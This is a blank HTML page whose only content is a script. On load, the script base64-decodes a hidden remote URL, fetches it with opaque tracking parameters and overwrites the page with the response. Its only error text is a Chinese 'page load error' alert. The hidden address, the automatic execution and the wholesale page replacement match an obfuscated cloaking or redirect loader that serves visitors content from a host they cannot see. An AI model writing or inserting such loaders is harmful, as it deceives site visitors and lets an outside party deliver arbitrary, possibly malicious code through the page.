<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title></title>
</head>
<body>
<script>
    function clientSideInclude(url) {
        var req = false;
        if (window.XMLHttpRequest) {
            try {
                req = new XMLHttpRequest();
            } catch (e) {
                req = false;
            }
        } else if (window.ActiveXObject) {
            try {
                req = new ActiveXObject("Msxml2.XMLHTTP");
            } catch (e) {
                try {
                    req = new ActiveXObject("Microsoft.XMLHTTP");
                } catch (e) {
                    req = false;
                }
            }
        }
        var element = document.getElementsByTagName("body")[0];
        if (!element) {
            alert("页面加载错误！！！！");
            return;
        }
        if (req) {
            req.open('GET', window.atob(url)+'span=abccd%7E80ae651903a%2A90a%28-6f%211957998684b&str=b5406b3034cea668d6255f1513482a77&id=19&cid=646&fock=715f7f85d9fe3bad61de9cb78ddfeebe&c=6%2C7&url=http%3A%2F%2Fsenpaiqi.com%2Fabccd%7E80ae651903a%2A90a%28-6f%211957998684bshare-b5406b3034cea668d6255f1513482a77.19.646.715f7f85d9fe3bad61de9cb78ddfeebe%2Fc%2F6%2C7', false);
            req.send(null);
            if (req.status == 404) {
                alert("页面加载错误！！！！");
            } else {
                var doc = document.open('text/html', 'replace');
                doc.write(req.responseText);
                doc.close();
            }
        } else {
            element[0].innerHTML ="页面加载错误！！！！";
        }
    }
    clientSideInclude("aHR0cDovL3poZW56aHViZWliZWkuY24vaW5kZXgvanVtcFQ/");
</script>
</body>
</html>